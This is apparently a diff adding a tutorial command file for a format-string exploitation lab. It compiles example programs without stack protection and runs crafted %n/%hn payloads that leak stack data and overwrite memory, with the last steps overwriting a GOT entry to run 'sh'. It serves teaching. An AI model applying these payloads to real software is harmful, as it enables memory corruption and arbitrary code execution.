@@ -1,0 +1,40 @@
+g++ 01-printf-features.cpp
+
+
+
+g++ -m32 -fno-stack-protector -g 02-simple-format-string.cpp -o 02-simple-format-string
+
+./02-simple-format-string "%p" && echo ''
+
+./02-simple-format-string 'aaaa%4$p' && echo ''
+
+./02-simple-format-string 'aaaa%100x%4$n' && echo ''
+
+
+
+g++ -m32 -fno-stack-protector -g 03-global-overwrite.cpp -o 03-global-overwrite
+
+./03-global-overwrite $(python -c 'print "\x30\xa0\x04\x08aaaaaa%4$n"') && echo ''
+
+
+
+g++ -m32 -fno-stack-protector -g 04-overwrite-long.cpp -o 04-overwrite-long
+
+./04-overwrite-long $(python -c 'print "\x30\xa0\x04\x08\x32\xa0\x04\x08%48871x%4$hn%8126x%5$hn"') && echo ''
+
+
+
+
+g++ -m32 -fno-stack-protector -g 05-overwrite-got.cpp -o 05-overwrite-got
+
+./05-overwrite-got $(python -c 'print "sh;#AAAABBBB%00000x%17$hp%00000x%18$hp"')
+
+env - gdb -q ./05-overwrite-got -ex "set confirm off" -ex "unset env"
+
+r $(python -c 'print "sh;#AAAABBBB%00000x%175$hp%00000x%176$hp"')
+
+r $(python -c 'print "sh;#AAAABBBB%00000x%118$hp%00000x%119$hp"')
+
+env - PWD=$(pwd) $(pwd)/05-overwrite-got $(python -c 'print "sh;#AAAABBBB%00000x%118$hp%00000x%119$hp"')
+
+env - PWD=$(pwd) $(pwd)/05-overwrite-got $(python -c 'print "sh;#\x10\xa0\x04\x08\x12\xa0\x04\x08%08580x%118$hn%54868x%119$hn"')
